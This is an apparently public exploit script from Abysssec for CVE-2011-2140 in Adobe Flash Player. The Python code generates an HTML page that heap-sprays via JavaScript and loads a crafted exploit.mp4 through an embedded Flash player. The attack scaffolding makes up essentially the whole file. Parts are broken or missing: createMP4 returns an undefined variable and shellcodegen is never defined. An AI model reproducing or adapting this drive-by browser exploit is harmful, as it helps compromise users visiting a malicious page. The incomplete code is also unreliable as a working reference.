# Abysssec Public Exploit
# CVE-2011-2140 
# This exploit tested on Adobe Flash Player <= 10.3.181.34 ( XP sp3 )
# twitter : @abysssec
# contact : info [at] abysssec.com 
# http://www.abysssec.com/blog/2012/01/31/exploiting-cve-2011-2140-another-flash-player-vulnerability

import sys

def spray_heap():
    spray = '''
    function spray_heap()
        {

var payload = shellcodegen(payload)
var spray = shellcodegen(sprayer)
 
 do { 
       spray += spray; 
    }
 while(spray.length < 0xA0000); 
 
 memory = new Array(); 
 
 for(i = 0; i < 100; i++) 
     memory[i] = spray + payload; 


}
        '''
        
    return spray
    
def createMP4():
    expectedFrames = 200
    
    return mp4
    
def main():
    try:
        fHtml = open('exploit.html', 'w+')
        contentHTML = '<html><script  type="text/javascript">' + spray_heap() + '</script><body onload = "spray_heap()"><object width="320" height="204" type="application/x-shockwave-flash" data="mediaplayer.swf?autostart=true&image=video.jpg&file=exploit.mp4"><param name="movie" value="mediaplayer.swf?autostart=true&image=video.jpg&file=exploit.mp4"></object></body></html>'
        fHtml.write(contentHTML)
        fHtml.close()
        
        fMP4 = open('exploit.mp4', 'w+')
        fMP4.write(createMP4())
        fMP4.close()
        print ('[-] MP4 and Html files generated')
    except IOError:
        print ('[*] Error : An IO error has occurred')
        print ('[-] Exiting ...')
        sys.exit(-1)
            
if __name__ == '__main__':
    main()
